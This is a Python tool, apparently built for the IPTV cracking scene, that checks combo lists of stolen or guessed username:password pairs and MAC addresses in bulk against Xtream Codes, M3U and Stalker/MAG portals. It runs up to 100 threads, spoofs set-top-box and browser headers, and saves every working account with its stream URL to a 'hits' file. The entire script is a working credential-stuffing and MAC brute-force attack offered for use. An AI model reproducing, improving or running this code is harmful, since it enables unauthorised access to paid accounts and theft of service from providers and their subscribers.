import os
import re
import json
import requests
from datetime import datetime
import time
import random
import traceback
import sys
import queue
import platform
from concurrent.futures import ThreadPoolExecutor

# Detectar sistema operativo
IS_WINDOWS = platform.system() == 'Windows'
IS_ANDROID = 'ANDROID_DATA' in os.environ or 'ANDROID_ROOT' in os.environ

# Configuración de rutas según el SO
if IS_ANDROID:
    BASE_DIR = "/sdcard/"
    COMBO_DIR = os.path.join(BASE_DIR, "combo")
    HITS_DIR = os.path.join(BASE_DIR, "Hits", "SHAMNA ULTRA APK 2025")
    CLEAR_CMD = "clear"
else:
    BASE_DIR = os.getcwd()
    COMBO_DIR = os.path.join(BASE_DIR, "combo")
    HITS_DIR = os.path.join(BASE_DIR, "Hits", "SHAMNA ULTRA APK 2025")
    CLEAR_CMD = "cls" if IS_WINDOWS else "clear"

# Habilitar soporte ANSI en Windows
if IS_WINDOWS:
    import ctypes
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)

# Códigos de color ANSI
COLOR_RESET = "\033[0m"
COLOR_RED = "\033[38;5;196m"
COLOR_GREEN = "\033[38;5;46m"
COLOR_YELLOW = "\033[38;5;226m"
COLOR_BLUE = "\033[38;5;39m"
COLOR_MAGENTA = "\033[38;5;201m"
COLOR_CYAN = "\033[38;5;51m"
COLOR_WHITE = "\033[38;5;231m"
COLOR_GRAY = "\033[38;5;240m"
COLOR_BOLD = "\033[1m"
COLOR_UNDERLINE = "\033[4m"

# Estilos
STYLE_HIT = COLOR_GREEN + COLOR_BOLD
STYLE_SERVER = COLOR_CYAN + COLOR_BOLD
STYLE_MAC = COLOR_YELLOW + COLOR_BOLD
STYLE_M3U = COLOR_MAGENTA + COLOR_BOLD
STYLE_ERROR = COLOR_RED + COLOR_BOLD
STYLE_INFO = COLOR_BLUE
STYLE_HEADER = COLOR_CYAN + COLOR_BOLD + COLOR_UNDERLINE
STYLE_RESET = COLOR_RESET
STYLE_COMBO = COLOR_YELLOW
STYLE_PROGRESS = COLOR_GRAY
STYLE_THREAD = COLOR_MAGENTA
STYLE_TURBO = COLOR_RED + COLOR_BOLD

# Banner de inicio
def print_banner():
    banner = f"""
{COLOR_CYAN}╔═════════════════════════════════════════════════════════════════╗
{COLOR_CYAN}║ {COLOR_MAGENTA}███████╗██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ███╗   ██╗ █████╗ {COLOR_CYAN}║
{COLOR_CYAN}║ {COLOR_MAGENTA}██╔════╝██║  ██║██╔══██╗████╗ ████║██╔══██╗████╗  ██║██╔══██╗{COLOR_CYAN}║
{COLOR_CYAN}║ {COLOR_MAGENTA}███████╗███████║███████║██╔████╔██║███████║██╔██╗ ██║███████║{COLOR_CYAN}║
{COLOR_CYAN}║ {COLOR_MAGENTA}╚════██║██╔══██║██╔══██║██║╚██╔╝██║██╔══██║██║╚██╗██║██╔══██║{COLOR_CYAN}║
{COLOR_CYAN}║ {COLOR_MAGENTA}███████║██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██║  ██║{COLOR_CYAN}║
{COLOR_CYAN}║ {COLOR_MAGENTA}╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝{COLOR_CYAN}║
{COLOR_CYAN}╠═════════════════════════════════════════════════════════════════╣
{COLOR_CYAN}║ {COLOR_GREEN}SHAMNA ULTRA APK 2025 - DUAL EDITION (Windows/Android)   {COLOR_CYAN}║
{COLOR_CYAN}║ {COLOR_YELLOW}  Máster code THE-HUNTER - Python vertion by @TEOSS_2022 - Versión Windows-Android - CODE to MAC and M3U    {COLOR_CYAN}║
{COLOR_CYAN}╚═════════════════════════════════════════════════════════════════╝{COLOR_RESET}
"""
    print(banner)
    print(f"{STYLE_INFO}💻 Ejecutando en: {'Android' if IS_ANDROID else 'Windows'}{STYLE_RESET}")
    print(f"{STYLE_INFO}📁 Directorio combo: {COMBO_DIR}{STYLE_RESET}")
    print(f"{STYLE_INFO}💾 Directorio de hits: {HITS_DIR}{STYLE_RESET}")

def clear_screen():
    """Limpiar pantalla según el SO"""
    os.system(CLEAR_CMD)

def ensure_directories():
    """Crear directorios necesarios"""
    os.makedirs(COMBO_DIR, exist_ok=True)
    os.makedirs(HITS_DIR, exist_ok=True)

def list_combo_files():
    """Listar archivos combo disponibles"""
    ensure_directories()
    
    txt_files = [f for f in os.listdir(COMBO_DIR) if f.endswith('.txt')]
    if not txt_files:
        print(f"{STYLE_ERROR}No se encontraron archivos combo en {COMBO_DIR}{STYLE_RESET}")
        print(f"{STYLE_INFO}Por favor, coloque sus archivos .txt en la carpeta combo{STYLE_RESET}")
        if IS_ANDROID:
            print(f"{STYLE_INFO}Ruta en Android: /sdcard/combo/{STYLE_RESET}")
        sys.exit(1)
    
    print(f"\n{STYLE_HEADER}📂 ARCHIVOS COMBO DISPONIBLES:{STYLE_RESET}")
    for i, file in enumerate(txt_files, 1):
        print(f"{STYLE_INFO}  {i}. {STYLE_COMBO}{file}{STYLE_RESET}")
    
    selection = int(input(f"\n{STYLE_HEADER}👉 SELECCIONE UN ARCHIVO (NÚMERO):{STYLE_RESET} ")) - 1
    return os.path.join(COMBO_DIR, txt_files[selection])

def detect_server_type(server):
    """Detectar tipo de servidor basado en patrones comunes"""
    server = server.lower()
    if "get.php" in server:
        return "m3u_direct"
    elif "player_api.php" in server:
        return "xtream"
    elif "/c/" in server or "stalker" in server or "portal.php" in server or "mac=" in server:
        return "mag"
    else:
        return "universal"

def check_m3u_account(server, username, password):
    """Verificar cuenta M3U probando diferentes patrones de URL"""
    # Asegurar que el servidor tenga el formato correcto
    server = server.rstrip('/')
    if not server.startswith('http'):
        server = 'http://' + server
    
    m3u_formats = [
        f"{server}/get.php?username={username}&password={password}&type=m3u_plus",
        f"{server}/live/{username}/{password}/",
        f"{server}/{username}/{password}/all.m3u",
        f"{server}/m3u/{username}/{password}/",
        f"{server}/iptv/{username}/{password}/",
        f"{server}/{username}/{password}/tv.m3u",
        f"{server}/get.php?username={username}&password={password}&output=m3u8",
        f"{server}/enigma2.php?username={username}&password={password}&type=get_vod_categories"
    ]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    
    for m3u_url in m3u_formats:
        try:
            response = requests.get(m3u_url, headers=headers, timeout=5, allow_redirects=True)
            if response.status_code == 200:
                content = response.text
                
                # Verificar si es un archivo M3U válido
                if "#EXTM3U" in content and any(line.startswith("#EXTINF") for line in content.splitlines()):
                    return {
                        "valid": True,
                        "type": "m3u_direct",
                        "host": server,
                        "username": username,
                        "password": password,
                        "status": "Active",
                        "scan_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        "m3u_url": m3u_url
                    }
                
                # Verificar si es una respuesta JSON válida
                try:
                    data = response.json()
                    if data.get('user_info', {}).get('status') == 'Active' or data.get('auth', 0) == 1:
                        return {
                            "valid": True,
                            "type": "m3u_direct",
                            "host": server,
                            "username": username,
                            "password": password,
                            "status": "Active",
                            "scan_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                            "m3u_url": m3u_url
                        }
                except:
                    pass
                    
        except Exception as e:
            continue
    
    return {"valid": False}

def check_xtream_account(server, username, password):
    """Verificar cuenta Xtream Codes"""
    try:
        # Asegurar formato correcto del servidor
        server = server.rstrip('/')
        if not server.startswith('http'):
            server = 'http://' + server
        
        # Probar diferentes endpoints
        api_endpoints = [
            f"{server}/player_api.php",
            f"{server}/panel_api.php",
            f"{server}/api.php"
        ]
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "application/json",
            "Connection": "keep-alive"
        }
        
        for api_url in api_endpoints:
            try:
                full_url = f"{api_url}?username={username}&password={password}"
                response = requests.get(full_url, headers=headers, timeout=5)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                    except:
                        # Intentar extraer JSON de respuestas mal formadas
                        json_match = re.search(r'({.*})', response.text)
                        if json_match:
                            data = json.loads(json_match.group(1))
                        else:
                            continue
                    
                    # Verificar diferentes formatos de respuesta
                    if data.get('user_info', {}).get('status') == 'Active' or \
                       data.get('user_info', {}).get('auth', 0) == 1 or \
                       data.get('auth') == 1 or \
                       'server_info' in data:
                        
                        host = server
                        real_url = data.get('server_info', {}).get('url', server)
                        exp_date = data.get('user_info', {}).get('exp_date')
                        
                        if exp_date:
                            try:
                                exp_date = datetime.utcfromtimestamp(int(exp_date)).strftime('%d-%m-%Y (%H:%M:%S)')
                            except:
                                exp_date = str(exp_date)
                        
                        max_conn = data.get('user_info', {}).get('max_connections', '')
                        active_conn = data.get('user_info', {}).get('active_cons', '')
                        timezone = data.get('user_info', {}).get('timezone', '')
                        scan_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        
                        # Generar URL M3U
                        m3u_url = f"{server}/get.php?username={username}&password={password}&type=m3u_plus"
                        
                        return {
                            "valid": True,
                            "type": "xtream",
                            "host": host,
                            "real_url": real_url,
                            "username": username,
                            "password": password,
                            "status": "Active",
                            "exp_date": exp_date,
                            "max_conn": max_conn,
                            "active_conn": active_conn,
                            "timezone": timezone,
                            "scan_time": scan_time,
                            "m3u_url": m3u_url
                        }
            except:
                continue
                
    except Exception as e:
        pass
    
    return {"valid": False}

def check_mac_account(server, mac):
    """Versión optimizada con manejo robusto de MAC y mejor detección"""
    try:
        # Normalizar MAC - mantener los dos puntos si existen
        mac = mac.strip().upper()
        mac_clean = re.sub(r'[^0-9A-F:]', '', mac)
        
        # Si contiene dos puntos, mantener el formato original
        if ':' in mac_clean:
            mac_formatted = mac_clean
            # Asegurar que tenga 12 caracteres hexadecimales
            hex_chars = re.sub(r'[^0-9A-F]', '', mac_clean)
            if len(hex_chars) < 12:
                hex_chars = hex_chars.ljust(12, '0')[:12]
                # Reconstruir con dos puntos cada 2 caracteres
                mac_formatted = ':'.join(hex_chars[i:i+2] for i in range(0, 12, 2))
        else:
            # Sin dos puntos - limpiar y formatear
            hex_chars = re.sub(r'[^0-9A-F]', '', mac_clean)
            if len(hex_chars) < 12:
                hex_chars = hex_chars.ljust(12, '0')[:12]
            mac_formatted = ':'.join(hex_chars[i:i+2] for i in range(0, 12, 2))
        
        # Manejar diferentes formatos de servidor
        server = server.rstrip('/')
        if not server.startswith('http'):
            server = 'http://' + server
        
        # Extraer host y puerto
        server_parts = server.split('://', 1)[1].split('/', 1)[0]
        if ':' in server_parts:
            host, port = server_parts.split(':', 1)
            port = int(port)
        else:
            host = server_parts
            port = 80
        
        base_url = f"http://{host}:{port}" if port != 80 else f"http://{host}"
        
        # Intentar diferentes endpoints de portal
        portal_endpoints = [
            f"{base_url}/portal.php",
            f"{base_url}/stalker_portal/server/load.php",
            f"{base_url}/c/"
        ]
        
        for portal_base in portal_endpoints:
            try:
                # 1. Handshake inicial
                url1 = f"{portal_base}?type=stb&action=handshake&token=&JsHttpRequest=1-xml"
                headers1 = {
                    "User-Agent": "Lavf53.32.100",
                    "Pragma": "no-cache",
                    "Accept": "*/*",
                    "Referer": f"{base_url}/c/index.html",
                    "Accept-Language": "en-US,en;q=0.5",
                    "X-User-Agent": "Model: MAG250; Link: WiFi",
                    "Host": f"{host}:{port}",
                    "Cookie": f"mac={mac_formatted}; stb_lang=en; timezone=Europe%2FParis",
                    "Connection": "Close",
                    "Accept-Encoding": "gzip, deflate"
                }
                
                # Usar sesión persistente
                session = requests.Session()
                response1 = session.get(url1, headers=headers1, timeout=10)
                
                if response1.status_code != 200 or '"js":{"token"' not in response1.text:
                    continue
                
                token_data = json.loads(response1.text)
                token = token_data['js']['token']
                
                # 2. Obtener perfil
                url2 = f"{portal_base}?type=stb&action=get_profile&JsHttpRequest=1-xml"
                headers2 = headers1.copy()
                headers2["Authorization"] = f"Bearer {token}"
                
                response2 = session.get(url2, headers=headers2, timeout=10)
                if response2.status_code != 200:
                    continue
                    
                profile_data = json.loads(response2.text)
                timezone = profile_data['js'].get('default_timezone', '')
                
                # 3. Obtener información de cuenta
                url3 = f"{portal_base}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                headers3 = headers2.copy()
                
                response3 = session.get(url3, headers=headers3, timeout=10)
                if response3.status_code != 200 or '"js":{"mac"' not in response3.text:
                    continue
                
                account_data = json.loads(response3.text)['js']
                portal = f"{base_url}/c/"
                mac_address = account_data['mac']
                expires_date = account_data.get('phone', account_data.get('exp_date', 'N/A'))
                
                # Verificar si la cuenta está activa
                status = "Active"
                if 'status' in account_data:
                    status = account_data['status']
                elif 'account_status' in account_data:
                    status = account_data['account_status']
                
                return {
                    "valid": True,
                    "type": "mag",
                    "host": portal,
                    "mac": mac_address,
                    "exp_date": expires_date,
                    "timezone": timezone,
                    "status": status,
                    "scan_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                
            except:
                continue
        
        return {"valid": False}
        
    except Exception as e:
        return {"valid": False}

def check_account(server, credentials, server_type, name):
    """Manejo unificado de credenciales con reintentos"""
    # Para servidores MAC, las credenciales son la MAC completa
    if server_type == "mag":
        result = check_mac_account(server, credentials)
        # Reintentar si falla la primera vez
        if not result["valid"]:
            time.sleep(1)  # Esperar antes de reintentar
            result = check_mac_account(server, credentials)
        return result
    
    # Para otros servidores, dividir en usuario y contraseña
    if ':' in credentials:
        username, password = credentials.split(':', 1)
    else:
        username = credentials
        password = ""
    
    if server_type == "m3u_direct":
        return check_m3u_account(server, username, password)
    
    if server_type == "xtream":
        return check_xtream_account(server, username, password)
    
    # Modo universal
    result = check_xtream_account(server, username, password)
    if result["valid"]:
        return result
        
    result = check_m3u_account(server, username, password)
    if result["valid"]:
        return result
    
    # Solo intentar MAC si parece una MAC válida
    if re.match(r'^([0-9A-Fa-f]{2}[:-]?){5}[0-9A-Fa-f]{2}$', credentials):
        return check_mac_account(server, credentials)
    
    return {"valid": False}

def save_hit(hit_data, name, hits_dir):
    """Guardar hit en formato apropiado"""
    hits_file = os.path.join(hits_dir, "SHAMNA ULTRA APK 2025 Hits.txt")
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    if hit_data["type"] == "xtream":
        hit_info = f"""●—————————————— {timestamp} ——————————————●
╭─➤ 🇹🇳🦅 𝕊ℍ𝔸𝕄ℕ𝔸 𝕌𝕃𝕋ℝ𝔸 𝔸ℙ𝕂 𝟚𝟘𝟚𝟝 🦅🇹🇳
├➤ 𝗛𝗶𝘁𝘀 ʙʏ 🦅🇹🇳 {name} 🦅🇹🇳
├➤🦅🇹🇳Portal ➤ {hit_data['host']}
├➤🦅🇹🇳Real ➤ {hit_data.get('real_url', hit_data['host'])}
├➤🦅🇹🇳USER ➤ {hit_data['username']}
├➤🦅🇹🇳PASS ➤ {hit_data['password']}
├➤🦅🇹🇳STATUS ➤ {hit_data['status']}
├➤🦅🇹🇳End Date ➤ {hit_data.get('exp_date', 'N/A')}
├➤🦅🇹🇳ACT CNX ➤ {hit_data.get('active_conn', '')}
├➤🦅🇹🇳MAX CNX ➤ {hit_data.get('max_conn', '')}
├➤🦅TimeZone ➤ {hit_data.get('timezone', '')}
├➤🦅🇹🇳APK DOWNLOADER CODE ➤ 927182
├➤🦅🇹🇳M3U url ➤ {hit_data.get('m3u_url', '')}
╰─➤🦅🇹🇳 𝗔𝗿𝗿𝗲𝗴𝗹𝗼𝘀 𝘆 𝗱𝘂𝗮𝗹𝗶𝗱𝗮𝗱 𝗽𝗼𝗿 @𝗧𝗘𝗢𝗦𝗦_2022

▀▄▀▄▀▄ 🆃🅷🅴_🅷🆄🅽🆃🅴🆁 🅾️🅿️🅴🅽🅱️🆄🅻🅴🆃 1 🅲🅾️🅽🅵🅸🅶 ▄▀▄▀▄▀
⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱
⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱\n\n"""
    
    elif hit_data["type"] == "m3u_direct":
        hit_info = f"""●—————————————— {timestamp} ——————————————●
╭─➤ 🇹🇳🦅 𝕊ℍ𝔸𝕄ℕ𝔸 𝕌𝕃𝕋ℝ𝔸 𝔸ℙ𝕂 𝟚𝟘𝟚𝟝 🦅🇹🇳
├➤ 𝗛𝗶𝘁𝘀 ʙʏ 🦅🇹🇳 {name} 🦅🇹🇳
├➤🦅🇹🇳Server ➤ {hit_data['host']}
├➤🦅🇹🇳Type ➤ Direct M3U
├➤🦅🇹🇳USER ➤ {hit_data['username']}
├➤🦅🇹🇳PASS ➤ {hit_data['password']}
├➤🦅🇹🇳STATUS ➤ {hit_data['status']}
├➤🦅🇹🇳M3U url ➤ {hit_data.get('m3u_url', '')}
╰─➤🦅🇹🇳𝗔𝗿𝗿𝗲𝗴𝗹𝗼𝘀 𝘆 𝗱𝘂𝗮𝗹𝗶𝗱𝗮𝗱 𝗽𝗼𝗿 @𝗧𝗘𝗢𝗦𝗦_2022

▀▄▀▄▀▄ 🆃🅷🅴_🅷🆄🅽🆃🅴🆁 🅾️🅿️🅴🅽🅱️🆄🅻🅴🆃 1 🅲🅾️🅽🅵🅸🅶 ▄▀▄▀▄▀
⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱
⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱\n\n"""
    
    elif hit_data["type"] == "mag":
        hit_info = f"""●—————————————— {timestamp} ——————————————●
╭─➤ 🇹🇳🦅 𝕊ℍ𝔸𝕄ℕ𝔸 𝕌𝕃𝕋ℝ𝔸 𝔸ℙ𝕂 𝟚𝟘𝟚𝟝 🦅🇹🇳
├➤ 𝗛𝗶𝘁𝘀 ʙʏ 🦅🇹🇳 {name} 🦅🇹🇳
├➤🦅🇹🇳Server ➤ {hit_data['host']}
├➤🦅🇹🇳Type ➤ MAG Device
├➤🦅🇹🇳MAC Address ➤ {hit_data['mac']}
├➤🦅🇹🇳STATUS ➤ {hit_data['status']}
├➤🦅🇹🇳End Date ➤ {hit_data.get('exp_date', 'N/A')}
├➤🦅TimeZone ➤ {hit_data.get('timezone', '')}
╰─➤🦅🇹🇳𝗔𝗿𝗿𝗲𝗴𝗹𝗼𝘀 𝘆 𝗱𝘂𝗮𝗹𝗶𝗱𝗮𝗱 𝗽𝗼𝗿 @𝗧𝗘𝗢𝗦𝗦_2022

▀▄▀▄▀▄ 🆃🅷🅴_🅷🆄🅽🆃🅴🆁 🅾️🅿️🅴🅽🅱️🆄🅻🅴🆃 1 🅲🅾️🅽🅵🅸🅶 ▄▀▄▀▄▀
⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱
⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱\n\n"""
    
    with open(hits_file, 'a', encoding='utf-8') as hit_file:
        hit_file.write(hit_info)
    
    return hits_file, hit_info

def print_hit(hit_info, hit_type):
    """Imprimir hit con colores según tipo"""
    if hit_type == "mag":
        print(f"{STYLE_MAC}{hit_info}{STYLE_RESET}")
    elif hit_type == "m3u_direct":
        print(f"{STYLE_M3U}{hit_info}{STYLE_RESET}")
    elif hit_type == "xtream":
        print(f"{STYLE_HIT}{hit_info}{STYLE_RESET}")
    else:
        print(hit_info)

def worker(combo, server, server_type, name, hits_dir, progress_queue):
    """Función de trabajo para verificación en paralelo"""
    try:
        result = check_account(server, combo, server_type, name)
        
        if result["valid"]:
            hits_file, hit_info = save_hit(result, name, hits_dir)
            progress_queue.put(('hit', combo, result, hits_file, hit_info))
        else:
            progress_queue.put(('invalid', combo, None, None, None))
        
        # Pequeño delay aleatorio para evitar sobrecarga
        time.sleep(random.uniform(0.1, 0.5))
        
    except Exception as e:
        error_trace = traceback.format_exc()
        progress_queue.put(('error', combo, error_trace, None, None))

def select_thread_mode(total_combos, server_type):
    """Permite al usuario seleccionar el modo de hilos con ajuste para MAC"""
    print(f"\n{STYLE_HEADER}⚙️ SELECCIONE MODO DE HILOS:{STYLE_RESET}")
    print(f"{STYLE_INFO}1. Automático (recomendado) [5-20 hilos]{STYLE_RESET}")
    print(f"{STYLE_INFO}2. Manual (elige tú el número){STYLE_RESET}")
    
    # En Android, limitar el modo turbo para evitar sobrecarga
    if not IS_ANDROID:
        print(f"{STYLE_TURBO}3. Turbo (máximo rendimiento) [100 hilos]{STYLE_RESET}")
    
    choice = input(f"\n{STYLE_HEADER}👉 ELIJA UNA OPCIÓN (1-3):{STYLE_RESET} ").strip()
    
    if choice == "1":
        # Cálculo automático de hilos con ajuste para MAC
        if server_type == "mag":
            num_threads = min(10, max(3, total_combos // 20 + 1))
            print(f"\n{STYLE_INFO}⚡ Modo Automático (optimizado para MAC): Usando {num_threads} hilos{STYLE_RESET}")
        else:
            num_threads = min(20, max(5, total_combos // 10 + 1))
            print(f"\n{STYLE_INFO}⚡ Modo Automático: Usando {num_threads} hilos{STYLE_RESET}")
        return num_threads
    
    elif choice == "2":
        # Modo manual
        max_threads = 50 if IS_ANDROID else 100
        while True:
            try:
                num_threads = int(input(f"\n{STYLE_HEADER}👉 INGRESE NÚMERO DE HILOS (1-{max_threads}):{STYLE_RESET} "))
                if 1 <= num_threads <= max_threads:
                    print(f"\n{STYLE_INFO}⚡ Modo Manual: Usando {num_threads} hilos{STYLE_RESET}")
                    return num_threads
                else:
                    print(f"{STYLE_ERROR}❌ Error: Ingrese un número entre 1 y {max_threads}{STYLE_RESET}")
            except ValueError:
                print(f"{STYLE_ERROR}❌ Error: Ingrese un número válido{STYLE_RESET}")
    
    elif choice == "3" and not IS_ANDROID:
        # Modo Turbo solo para Windows
        num_threads = 100
        print(f"\n{STYLE_TURBO}⚡⚡⚡ MODO TURBO ACTIVADO: 100 HILOS ⚡⚡⚡{STYLE_RESET}")
        print(f"{STYLE_TURBO}ADVERTENCIA: Esto puede consumir muchos recursos{STYLE_RESET}")
        return num_threads
    
    else:
        print(f"{STYLE_INFO}⚠️ Usando modo automático por defecto{STYLE_RESET}")
        if server_type == "mag":
            return min(10, max(3, total_combos // 20 + 1))
        else:
            return min(20, max(5, total_combos // 10 + 1))

def main():
    # Configuración inicial
    clear_screen()
    print_banner()
    
    # Obtener entradas del usuario
    server = input(f"{STYLE_HEADER}🌐 INGRESE URL DEL SERVIDOR (ej: http://server.com:puerto):{STYLE_RESET} ").strip()
    name = input(f"{STYLE_HEADER}👤 INGRESE SU NOMBRE [default: THE_HUNTER]:{STYLE_RESET} ").strip() or "THE_HUNTER"
    
    # Detectar tipo de servidor
    server_type = detect_server_type(server)
    print(f"{STYLE_INFO}🔍 Tipo de servidor detectado: {STYLE_SERVER}{server_type.upper()}{STYLE_RESET}")
    
    # Seleccionar archivo combo
    combo_path = list_combo_files()
    
    # Leer combos
    try:
        with open(combo_path, 'r', encoding='utf-8') as f:
            combos = [line.strip() for line in f if line.strip()]
        total = len(combos)
        print(f"{STYLE_INFO}📊 Total de cuentas a escanear: {total}{STYLE_RESET}")
    except Exception as e:
        print(f"{STYLE_ERROR}❌ ERROR LEYENDO ARCHIVO COMBO: {e}{STYLE_RESET}")
        return
    
    # Seleccionar modo de hilos (con ajuste para MAC)
    num_threads = select_thread_mode(total, server_type)
    
    # Configurar sistema de colas
    progress_queue = queue.Queue()
    valid_count = 0
    start_time = time.time()
    
    # Iniciar trabajadores
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        # Enviar todas las tareas
        futures = [executor.submit(worker, combo, server, server_type, name, HITS_DIR, progress_queue) for combo in combos]
        
        # Procesar resultados en tiempo real
        completed = 0
        last_update = time.time()
        
        while completed < total:
            try:
                # Usar timeout variable para evitar bloqueos
                timeout = 1.0 if server_type == "mag" else 0.5
                result_type, combo, result, hits_file, hit_info = progress_queue.get(timeout=timeout)
                completed += 1
                
                # Actualizar barra de progreso (máximo una vez por segundo)
                current_time = time.time()
                if current_time - last_update > 0.5 or completed == total:
                    percent = completed / total * 100
                    progress_bar = f"{STYLE_THREAD}[{'=' * int(percent/5)}{' ' * (20 - int(percent/5))}]"
                    elapsed = current_time - start_time
                    speed = completed / elapsed if elapsed > 0 else 0
                    print(f"\r{STYLE_PROGRESS}⏳ Progreso: {progress_bar} {percent:.1f}% | {completed}/{total} | Vel: {speed:.1f} cuentas/s{STYLE_RESET}", end='', flush=True)
                    last_update = current_time
                
                # Manejar resultados
                if result_type == 'hit':
                    valid_count += 1
                    print(f"\n\n{STYLE_HIT}{'═' * 60}")
                    print(f"{STYLE_HIT}╔═══════════════════════════════════════════════════╗")
                    print(f"║{COLOR_GREEN}                🎯 HIT DETECTED! 🎯                {STYLE_HIT}║")
                    print(f"╚═══════════════════════════════════════════════════╝")
                    print(f"{'═' * 60}{STYLE_RESET}")
                    print_hit(hit_info, result["type"])
                    print(f"{STYLE_HIT}✅ [+] HIT: {combo} | Tipo: {result['type']} | Guardado en {hits_file}{STYLE_RESET}")
                elif result_type == 'error':
                    print(f"\n{STYLE_ERROR}❌ ERROR en combo {combo}: {result}{STYLE_RESET}")
                
            except queue.Empty:
                # Verificar si todos los trabajadores han terminado
                if all(future.done() for future in futures):
                    break
                continue
    
    # Calcular estadísticas
    elapsed_time = time.time() - start_time
    speed = total / elapsed_time if elapsed_time > 0 else 0
    
    print(f"\n\n{STYLE_HEADER}{'═' * 60}")
    print(f"{STYLE_HEADER}🏁 PROCESO COMPLETADO!")
    print(f"🕒 Tiempo total: {elapsed_time:.2f} segundos")
    print(f"⚡ Velocidad promedio: {speed:.2f} cuentas/segundo")
    print(f"🧵 Hilos utilizados: {num_threads}")
    print(f"✅ Cuentas válidas encontradas: {valid_count}/{total}")
    print(f"{'═' * 60}{STYLE_RESET}")
    print(f"{STYLE_INFO}💾 HITS GUARDADOS EN: {os.path.join(HITS_DIR, 'SHAMNA ULTRA APK 2025 Hits.txt')}{STYLE_RESET}")
    
    # Mensaje final específico para Android
    if IS_ANDROID:
        print(f"\n{COLOR_CYAN}📁 Puede acceder a los resultados en: /sdcard/Hits/SHAMNA ULTRA APK 2025/{COLOR_RESET}")
    
    print(f"\n{COLOR_CYAN}👉 Presione Enter para salir...{COLOR_RESET}")
    input()

if __name__ == "__main__":
    main()